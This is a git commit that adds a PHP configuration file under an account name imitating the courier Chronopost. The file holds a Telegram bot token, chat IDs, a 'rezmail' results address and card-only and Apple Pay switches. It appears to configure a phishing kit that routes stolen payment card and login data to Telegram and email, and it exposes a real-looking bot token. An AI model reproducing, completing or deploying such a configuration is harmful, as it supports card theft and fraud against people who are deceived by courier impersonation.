4ec9370efdaddbf578675c54f16b12408b83eeeb
CHRONOPOSTT <157321016+CHRONOPOSTT@users.noreply.github.com>
2024-01-21 21:13:47 +0000

    Add files via upload

---
+++ config.php
@@ -0,0 +1,8 @@
+<?php 
+$bot_token = "6734247701:AAE_SLpZoiKt17Lwr4QdR7sSgie0YAP5hI0";
+$chat_id = "6385306701";
+$chat_idlog = "6385306701";
+$apple_pay = "6385306701";
+$rezmail = "comptepourfrze@gmail.com";
+$onlycards = "0"; // 1 or 0
+?>
